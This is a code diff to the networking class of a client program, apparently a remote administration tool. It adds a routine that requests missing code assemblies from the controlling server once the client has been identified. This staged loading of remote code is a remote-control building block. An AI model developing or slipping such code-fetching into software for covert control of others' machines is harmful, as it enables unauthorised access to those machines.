@@ -27,6 +27,11 @@ namespace Pulsar.Client.Networking
         private bool _identified;
 
         /// <summary>
+        /// Indicates whether this client already requested deferred assemblies for the current session.
+        /// </summary>
+        private bool _requestedDeferredAssemblies;
+
+        /// <summary>
         /// The hosts manager which contains the available hosts to connect to.
         /// </summary>
         private readonly HostsManager _hosts;
@@ -143,6 +148,10 @@ namespace Pulsar.Client.Networking
                 if (message is ClientIdentificationResult reply)
                 {
                     _identified = reply.Result;
+                    if (_identified)
+                    {
+                        RequestDeferredAssemblies();
+                    }
                 }
                 return;
             }
@@ -159,6 +168,7 @@ namespace Pulsar.Client.Networking
         private void OnClientState(Client client, bool connected)
         {
             _identified = false; // always reset identification
+            _requestedDeferredAssemblies = false;
 
             if (connected)
             {
@@ -188,6 +198,36 @@ namespace Pulsar.Client.Networking
                 };
 
                 client.Send(identification);
+            }
+        }
+
+        private void RequestDeferredAssemblies()
+        {
+            if (_requestedDeferredAssemblies)
+            {
+                return;
+            }
+
+            var missingAssemblies = DeferredAssemblyManager.GetMissingAssemblies();
+            if (missingAssemblies == null || missingAssemblies.Length == 0)
+            {
+                return;
+            }
+
+            try
+            {
+                Send(new RequestDeferredAssemblies
+                {
+                    Assemblies = missingAssemblies,
+                    ClientVersion = Settings.ReportedVersion
+                });
+
+                _requestedDeferredAssemblies = true;
+                Debug.WriteLine($"Requested {missingAssemblies.Length} deferred assemblies from server.");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Failed to request deferred assemblies: {ex.Message}");
             }
         }
 
